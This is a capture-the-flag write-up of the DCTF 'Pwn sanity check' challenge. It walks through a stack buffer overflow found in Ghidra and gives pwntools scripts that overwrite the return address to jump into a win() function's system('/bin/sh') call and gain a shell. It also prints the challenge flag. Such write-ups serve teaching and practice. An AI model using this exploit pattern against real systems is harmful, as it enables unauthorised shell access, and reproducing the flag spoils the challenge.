---
title: Pwn sanity check
layout: post
author: v1per
date: 2021-05-17 18:53:00 +0530
type: Pwn
difficulty: easy
prompt: This should take about 1337 seconds to solve.  **nc dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io 7480**
---

First, I used the file command on the **pwn_sanity_check** file. This is the output I got:

![](/images/v1per/dctfpsc1.png)

So, we know that it's a 64-bit LSB executable. Next, I opened the binary file usng **Ghidra**.
The main function looked like this:

![](/images/v1per/dctfpsc2.png)

I opened the **vuln()** function, and found this:

![](/images/v1per/dctfpsc3.png)

Here, I saw that the input is being taken using 'fgets' and stored in 'local_48'. Seeing this, the first thought which came to my mind was that this could be a buffer overflow challenge. In the next line I saw that if the value of 'local_c' is equal to '-0x21523f22', it prints out a text and calls the 'shell()' function. Let's open that:

![](/images/v1per/dctfpsc4.png)

It prints out that it is spawing the '/bin/sh process', but it doesn't really do anything except printing that. So, I guess that's a deadend.

Looking around further, I found a 'win()' function which looked interesting:

![](/images/v1per/dctfpsc5.png)

This function takes two parameters as input and compares their values and actually spawns a shell. Now, here I thought what if we could bypass the if conditions and directly go to the 'system("/bin/sh");' line.
I took note of the address of the line just before the line in which the shell was being spawned: **0x004006d6**

![](/images/v1per/dctfpsc6.png)

Now, we need to find the offset at which our control enters the win function, I used this python code to find it:

```py
from pwn import *

host='dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io'
port=7480

n=0
while(True):
	error=False
	payload=b'A'*n+p64(0x004006d6)

	r=remote(host,port)
	r.sendline(payload)
	r.recvline()
	r.recvline()

	try:
		s=r.recvline()
	except:
		error=True

	if error:
		print(n,'Trying...')
	else:
		print(n,'is the offset')
		break
	n+=1
```

From this script, the offset came out to be **72**. Now, it's time to finally find our flag.
I ran this script:

```py
from pwn import *

host='dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io'
port=7480

payload=b'A'*72+p64(0x004006d6)

r=remote(host,port)
r.sendline(payload)
r.interactive()
```

And, yay! I got the shell.
I typed in 'ls' and saw that there's a flag.txt file in there, so i did a 'cat flag.txt' and got the flag!
```dctf{Ju5t_m0v3_0n}```

![](/images/v1per/dctfpsc7.png)